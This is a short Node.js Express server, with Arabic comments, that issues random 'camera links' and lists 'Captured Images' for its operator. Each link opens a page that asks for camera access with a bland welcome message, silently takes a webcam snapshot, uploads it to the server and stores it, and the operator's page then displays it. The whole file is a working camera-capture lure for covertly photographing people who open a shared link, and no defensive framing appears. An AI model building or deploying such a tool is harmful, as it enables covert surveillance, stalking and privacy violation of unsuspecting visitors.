const express = require('express');
const app = express();
app.use(express.json({ limit: '5mb' }));

const PORT = process.env.PORT || 3000;

// لتخزين الصور مؤقتًا حسب الرابط
const images = {};

// الصفحة الرئيسية: توليد الروابط واستعراض الصور
app.get('/', (req, res) => {
  const allImages = Object.entries(images).map(
    ([id, img]) => `<h3>Image from link ${id}</h3><img src="${img}" style="max-width:100%">`
  ).join('');

  res.send(`
    <html>
      <head>
        <title>Main Page</title>
        <style>
          body { font-family: Arial; text-align:center; margin:50px; }
          button { padding:10px 20px; font-size:16px; cursor:pointer; margin:10px; }
          a { display:block; margin:10px; color:blue; text-decoration:none; }
        </style>
      </head>
      <body>
        <h1>Press button to generate a new link</h1>
        <button onclick="generate()">Generate Link</button>
        <div id="links"></div>
        <h2>Captured Images</h2>
        ${allImages}
        <script>
          function generate() {
            const id = Math.floor(Math.random()*100000);
            const link = '/camera/' + id;
            const a = document.createElement('a');
            a.href = link;
            a.textContent = 'Camera Link: ' + link;
            document.getElementById('links').appendChild(a);
          }
        </script>
      </body>
    </html>
  `);
});

// صفحة الكاميرا لكل رابط
app.get('/camera/:id', (req, res) => {
  const id = req.params.id;
  res.send(`
    <html>
      <head>
        <title>Camera Page</title>
        <style>
          body { font-family: Arial; text-align:center; margin:50px; }
          img { max-width:100%; margin-top:20px; }
        </style>
      </head>
      <body>
        <h1>Welcome!</h1>
        <p>The website wants to access your camera. Please allow it.</p>
        <img id="photo" alt="Your photo will appear here">
        <script>
          const photo = document.getElementById('photo');

          // فتح الكاميرا وطلب إذن المستخدم
          navigator.mediaDevices.getUserMedia({ video:true })
            .then(stream => {
              const video = document.createElement('video');
              video.srcObject = stream;
              video.play();

              // التقاط صورة واحدة بعد فتح الكاميرا
              video.addEventListener('loadedmetadata', () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');

                // إرسال الصورة للسيرفر
                fetch('/upload/${id}', {
                  method:'POST',
                  headers:{ 'Content-Type':'application/json' },
                  body: JSON.stringify({ image: imageData })
                });

                photo.src = imageData; // عرض الصورة
                // إيقاف الكاميرا
                video.srcObject.getTracks().forEach(t => t.stop());
              });
            })
            .catch(err => alert('Cannot access camera: ' + err.message));
        </script>
      </body>
    </html>
  `);
});

// استقبال الصورة وحفظها حسب الرابط
app.post('/upload/:id', (req,res) => {
  const { id } = req.params;
  const { image } = req.body;
  images[id] = image;
  res.json({ success:true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
